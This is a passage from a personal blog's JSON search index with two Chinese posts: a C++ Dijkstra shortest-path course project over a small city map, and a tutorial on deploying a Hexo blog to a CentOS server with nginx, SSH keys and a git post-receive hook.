std; string CityList[MAXLEN]; int map[MAXLEN][MAXLEN]= {0}; int N; bool check_input(int x,int y,int w,int N){ if (w\u003c0 || x==y || x\u003eN || y\u003eN || (map[x][y]!=0 \u0026\u0026 map[x][y]!=MAX)|| (map[x][y]!=0 \u0026\u0026 map[x][y]!=MAX)){ cout\u003c\u003c\"该组数据不符合规范，请重新输入\"\u003c\u003cendl; getch(); return true; } return false; } void Readin() { int M,x,y,w; memset(map,sizeof(map),0); cout\u003c\u003c\"请输入城市总数:\"; cin\u003e\u003eN; cout\u003c\u003c\"请输入路径数量:\"; cin\u003e\u003eM; if (M\u003e(N+1)*N/2){ cout\u003c\u003c\"您输入的路径数量大于最大可能路径数量\"\u003c\u003cendl; getch(); return; } cout\u003c\u003cendl; for (int i=1; i\u003c=N; i++) { printf(\"第%d个城市名称:\",i); cin\u003e\u003eCityList[i]; } printf(\"城市x编号 城市y编号 路径长度\\n\"); printf(\"-----------------------------\\n\"); for (int i=1; i\u003c=M; i++) { do{ printf(\"第%d组:\",i); cin\u003e\u003ex\u003e\u003ey\u003e\u003ew; }while(check_input(x,y,w,N)); map[x][y]=w; map[y][x]=w; } for (int i=1; i\u003c=N; i++) { for (int j=1; j\u003c=N; j++) if (i!=j \u0026\u0026 map[i][j]==0) map[i][j]=MAX; } } void Mapprint(int n=N) { if (N==0) return; cout\u003c\u003c\"\\t\"; for (int i=1; i\u003c=n; i++) cout\u003c\u003cCityList[i]\u003c\u003c\"\\t\"; cout\u003c\u003cendl; for (int i=1; i\u003c=n*9; i++) cout\u003c\u003c'-'; cout\u003c\u003cendl; for (int i=1; i\u003c=n; i++) { cout\u003c\u003cCityList[i]\u003c\u003c\"\\t\"; for (int j=1; j\u003c=n; j++) if (map[i][j]!=MAX) cout\u003c\u003cmap[i][j]\u003c\u003c\"\\t\"; else cout\u003c\u003c\"-\\t\"; cout\u003c\u003cendl; } } void Mapadd() { int n,x,y,w,m; cout\u003c\u003c\"请输入增加的城市个数:\"; cin\u003e\u003en; cout\u003c\u003c\"请输入新增的路径个数:\"; cin\u003e\u003em; //\tif (m\u003e(N*n+(n+1)*n/2)){ //\tcout\u003c\u003c\"您输入的路径数量大于最大可能路径数量\"\u003c\u003cendl; //\tgetch(); //\treturn; //\t} cout\u003c\u003cendl; for(int i=N+1; i\u003c=N+n; i++) { printf(\"第%d个城市的名称:\",i); cin\u003e\u003eCityList[i]; } printf(\"\\n城市x编号 城市y编号 路径长度\\n\"); printf(\"-----------------------------\\n\"); for (int i=1; i\u003c=m; i++) { do{ printf(\"第%d组:\",i); cin\u003e\u003ex\u003e\u003ey\u003e\u003ew; }while (check_input(x,y,w,N+n)); map[x][y]=w; map[y][x]=w; } for (int i=1;i\u003c=N+n;i++) for(int j=1;j\u003c=N+n;j++) if (i!=j \u0026\u0026 map[i][j]==0) map[i][j]=MAX; N=N+n; } void Delcol(int x) { int i,j; if (x\u003eN or x\u003c1) return; for (i=1; i\u003c=N; i++) { for (j=x; j\u003cN; j++) map[i][j]=map[i][j+1]; map[i][j]=0; } } void Delrow(int x) { int i; if (x\u003eN or x\u003c1) return; for (i=x; i\u003cN; i++) memcpy(map[i],map[i+1],sizeof(int)*(N)); memset(map[i],0,N-1); } void Delname(int x) { int i; for (i=x; i\u003cN; i++) CityList[i]=CityList[i+1]; CityList[i]= {0}; } void Mapdel() { int x; cout\u003c\u003c\"请输入您要删除的城市编号:\"; cin\u003e\u003ex; Delname(x); Delcol(x); Delrow(x); N--; } void Mapmod(){ string x,y; int i,j,w; cout\u003c\u003c\"请输入您要修改的两个城市的名称\"\u003c\u003cendl; cout\u003c\u003c\"城市A:\"; cin\u003e\u003ex; cout\u003c\u003c\"城市B:\";\tcin\u003e\u003ey; cout\u003c\u003c\"请输入修改值(输入值\u003c=0删除路径):\"; cin\u003e\u003ew; for (i=1;i\u003c=N;i++) if (x==CityList[i]) break; for (j=1;i\u003c=N;j++) if (y==CityList[j]) break; if (i==N \u0026\u0026 CityList[i]!=x){ cout\u003c\u003c\"无法找到城市A\"\u003c\u003cendl; getch(); return; } if (j==N \u0026\u0026 CityList[j]!=y){ cout\u003c\u003c\"无法找到城市B\"\u003c\u003cendl; getch(); return; } if (w\u003c=0) { map[i][j]=MAX; map[j][i]=MAX; } else{ map[i][j]=w; map[j][i]=w; } } bool check(bool* arr,int n){ for (int i=1;i\u003c=n;i++) if (!arr[i]) return true; return false; } void Dijkstra(){ int d,s=1,pos,m; cout\u003c\u003c\"请输入目的地城市（默认出发城市即编号为1的城市）\"\u003c\u003cendl; cin\u003e\u003ed; if (d\u003eN){ cout\u003c\u003c\"您输入的城市超出范围\"\u003c\u003cendl; getch(); return; } int dis[MAXLEN]={0}; bool is_v[MAXLEN]; string route[MAXLEN]; memset(is_v,0,sizeof(bool)*MAXLEN); for (int i=1;i\u003c=N;i++){ dis[i]=map[s][i]; route[i]=CityList[s]+\"--\u003e\"+CityList[i]; } dis[s]=0; is_v[s]=true; while (check(is_v,N)){ pos=0; m=MAX; for (int i=1;i\u003c=N;i++) if (!is_v[i] \u0026\u0026 m\u003edis[i]){ m=dis[i]; pos=i; } is_v[pos]=true; for (int i=1;i\u003c=N;i++) if (!is_v[i] \u0026\u0026 dis[pos]+map[pos][i]\u003e=0) { if (dis[i]\u003edis[pos]+map[pos][i]){ dis[i]=dis[pos]+map[pos][i]; route[i]=route[pos]+\"--\u003e\"+CityList[i]; } } } if (dis[d]==0){ cout\u003c\u003c\"不存在抵达该城市的路径\"\u003c\u003cendl; getch(); return; } cout\u003c\u003c\"最短路径长度:\"; cout\u003c\u003cdis[d]\u003c\u003cendl; cout\u003c\u003croute[d]\u003c\u003cendl; getch(); } void logo(){ system(\"cls\"); printf(\"\t____ _ _ __ __ \\n\"); printf(\"\t/ __ \\(_) (_) /_______/ /__________ _\\n\"); printf(\"\t/ / / / / / / //_/ ___/ __/ ___/ __ `/\\n\"); printf(\"\t/ /_/ / / / / ,\u003c (__ ) /_/ / / /_/ / \\n\"); printf(\"\t/_____/_/_/ /_/|_/____/\\\\__/_/ \\\\__,_/ \\n\"); printf(\"\t/___/ \\n\"); cout\u003c\u003c\" --code by Yuuki | cc\"\u003c\u003cendl; cout\u003c\u003c\"=============================================\"\u003c\u003cendl; Mapprint(); cout\u003c\u003c\"=============================================\"\u003c\u003cendl; cout\u003c\u003c\"\t1.录入城市路径 \"\u003c\u003cendl; cout\u003c\u003c\"\t2.增加城市路径 \"\u003c\u003cendl; cout\u003c\u003c\"\t3.编辑城市路径 \"\u003c\u003cendl; cout\u003c\u003c\"\t4.删除城市 \"\u003c\u003cendl; cout\u003c\u003c\"\t5.计算最短路径 \"\u003c\u003cendl; cout\u003c\u003c\"\t0.退出 \"\u003c\u003cendl; } void init(){ N=6; CityList[1]=\"南京\"; CityList[2]=\"镇江\"; CityList[3]=\"常州\"; CityList[4]=\"苏州\"; CityList[5]=\"无锡\"; CityList[6]=\"上海\"; map[1][2]=1; map[2][1]=1; map[2][4]=3; map[4][2]=3; map[4][6]=15; map[6][4]=15; map[5][6]=4; map[6][5]=4; map[5][3]=5; map[3][5]=5; map[1][3]=12; map[3][1]=12; map[2][3]=9; map[3][2]=9; map[3][4]=4; map[4][3]=4; map[4][5]=13; map[5][4]=13; for (int i=1;i\u003c=N;i++) for (int j=1;j\u003c=N;j++) if (i!=j \u0026\u0026 map[i][j]==0) map[i][j]=MAX; } int main() { string choice; N=0; init(); while (true){ logo(); cin\u003e\u003echoice; switch(choice[0]){ case '1': Readin(); break; case '2': Mapadd(); break; case '3': Mapmod(); break; case '4': Mapdel(); break; case '5': Dijkstra(); break; case '0': return 0; default: continue; } } return 0; } ","description":"","tags":["算法","象牙塔"],"title":"Dijkstra算法课设","uri":"/posts/dijkstra%E7%AE%97%E6%B3%95%E8%AF%BE%E8%AE%BE/"},{"categories":["Code"],"content":"开始前的碎碎念 为了搭建这个小站，搜索了很多资料，踩了很多坑。这里努力写点有用的东西防止后人踩坑。希望阅读的读者遇到问题时思考自己是否是符合本样例的情况。 这是一篇旨在使用linux服务器+nginx+hexo+git实现搭建个人博客的教学性质文章。\nrequires 一台服务器，本例子是linux centos,阿里的云服务器\n[root@host~]# lsb_release -a LSB Version: :core-4.1-amd64:core-4.1-noarch Distributor ID: CentOS Description: CentOS Linux release 7.6.1810 (Core) Release: 7.6.1810 Codename: Core 本地电脑：window 10\nnginx ; node.js ; hexo ; git ; npm\n本地电脑 安装git\nwindows 下载\nlinux使用包管理器安装git (不了解包管理器的同学就不要看下去了吧)\nyum install git -y 更多Git基本配置工作\n安装node.js (node.js自带npm)\n什么是npm，本垃圾觉得大概类似python的pip吧什么你不知道pip是啥？？？这是wiki打不开就算了\nwindows 下载\nlinux 下载对应版本的node.js以及安装操作 下载\n安装hexo\n使用node.js的npm安装hexo，这里windows可以先设置一下npm的默认安装目录，本强迫症表示你默认装在c盘我很难受。打开命令行，运行:\n坑：原教程里写了路径末尾加了node_modules，事实证明并不需要，这个命令会在目标目录生成一个node_modules。我这里设置默认安装路径在node.js本体的安装路径，因为这个路径里本身就有一个用于安装npm本身的nnode_modules文件夹。当然即使这样做了，npm运行缓存还是会存在c盘，需要继续修改设置的请移步这里\nnpm config set prefix \"E:\\node.js\\\" 安装hexo npm install -g hexo-cli 坑：-g意为global，全局安装就会安装到你设置的安装目录里，没有这个参数默认会安装在你npm当时命令行运行的目录里创建node_moudels并进行安装 搭建博客\n后续关于博客搭建的章节可以参照官方教程\n创建一个文件夹用于做博客的目录 切换到这个文件夹所在目录，运行命令： hexo init \u003cfolder name\u003e 进入该文件夹： npm install 坑：以上两步必不可缺，否则会产生缺少依赖问题，列入不生成静态文件（如x.html）的问题\n配置你的站点：\n修改博客目录下的_congfig.yml文件官方教程 书写你的第一篇文章：\n在你的博客文件夹内运行命令\nhexo new \"Hallow world\" 会在source文件夹内的默认_posts文件夹下生成一个md文件，接下来就可以参照markdown语法愉快的敲代码了\n生成你的网站：\n在你的博客文件夹内运行命令\nhexo generate 或者使用快捷缩写\nhexo g 在本地预览你的博客网站\nhexo server 或者使用快捷缩写\nhexo s 坑：如果generate出错请检查博客文件夹下_config.yml内的配置是否正确，每一个冒号后面必须跟一个空格！！！\n坑：如果没能本地预览可能是因为缺少hexo-server，请运行npm install hexo-server --save\n安装hexo-deployer-git\n安装该模块方便使用hexo最牛逼的推送功能\nnpm install hexo-deployer-git --save 本地配置git生成私钥以及公钥\n在git安装配置没有出错的情况下，环境变量完成配置，用户信息设置完全的情况下：\nssh-keygen -t rsa -C \"your_email@email.com\" 该命令会在c:\\user(你的电脑用户名).ssh文件加下生成密钥对。id_rsa文件为私钥，id_rsa.pub为公钥。 在后续的服务器配置过程中，我们会把公钥设置在服务器上，这样git推送的时候就可以免去密码认证\n服务器配置（linux） 安装nginx\nyum install nginx -y 你也可以使用lnmp一类的一键脚本安装web环境，这里不举例。\n配置nginx\n基本配置\n找到nginx的配置文件，默认在/etc/nginx/nginx.conf编辑内容\n基本只需要简单的修改默认配置中的网站根目录以及域名的设置，找到如下字段\nlisten 80 default_server; # 默认端口 listen [::]:80 default_server; server_name _; # 你的域名，没有的话根目录即可 root /home/www/blog; # 网站根目录,教程后续创建 启动nginx：\nservice nginx start service nginx reload 设置开机自启：\nchkconfig nginx on 或者\nsystemctl enable nginx.servcice 开放防火墙放行80端口\n运行\niptables -A INPUT -p tcp --dport 80 -j ACCEPT 保存防火墙设置\nservice iptables save 坑：本人这条命令并没有执行成功，这个版本的linux似乎不支持这条命令，最后还是执行的service iptables reload\n查看防火墙规则: 出现这条内容意味着防火墙设置完成:\n[root@host ~]# iptables --list -n Chain INPUT (policy ACCEPT) target prot opt source destination ACCEPT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:80 坑：云服务器供应商还会提供安全组一类的东西，请在那里面也放行对应端口\n测试nginx是否配置成功\n服务器本地访问又返回结果： curl 127.0.0.1 远程访问服务器网页端口，即在你的浏览器里输入服务器ip或者域名出现nginx默认页面即表示配置完成。 配置git\n如果服务器没有git请参照上面安装git\n新建git用户,并设置用户密码\nuseradd git passwd git 新建网站目录,并修改网站根目录的用户拥有者为git用户\ncd /home mkdir www cd www mkdir blog chown git:git blog 切换为git用户，进入其家目录创建.ssh文件夹，并进入\nsu git cd ~ mkdir .ssh cd .ssh 创建authorized_keys文件，讲你本地电脑上的公钥内的文件内容复制到该文件内。\n这里怎么操作自我发挥吧，把公钥文件传上来该跟名字，或者你开心就好\n设置密钥文件只读，文件夹权限:\nchmod 600 authorized_keys chmod 700 /home/git/.ssh 配置ssh的配置文件/etc/ssh/sshd_config，修改如下词条 RSAAuthentication yes # 开启rsa密钥认证 PubkeyAuthentication yes # 开启公钥认证 AuthorizedKeysFile .ssh/authorized_keys # 设置存贮文件 在你的git用户家目录下新建你的博客仓库,并初始化为git裸仓库\nmkdir blog.git git init --bare blog.git 配置裸仓库:进入仓库文件夹，在hooks文件夹内新建post_receive。文件写下一下内容\n#!/bin/bash git --work-tree=/home/www/blog --git-dir=/home/git/blog.git checkout -f 这是一个linux shell规定了当接受到post请求之后的动作，把文件内容放到网站根目录里\n在你的本地！！！ 测试ssh 免密码连接 ssh -T git@your_host 如果没有提示输入密码证明配置成功\n回到本地电脑 编辑blog下的配置文件_config.yml\n# Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: git@your_host:blog.git branch: master 愉快的测试推送把！~ 或者死于bug error hhh\nhexo deploy 或者\nhexo d 坑：不安装hexo-deployer-git是不可能推送的\n坑：如果访问页面出现cantnot GET/ 请检查主题设置，网上很多教程的设置基于hexo next主题，涉及到主题文件的请看你的主题的作者自己的文档，而不是看某dn\n","description":"","tags":["建站"],"title":"VPS+nginx+hexo搭建个人博客","uri":"/posts/vps-nginx-hexo%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"}]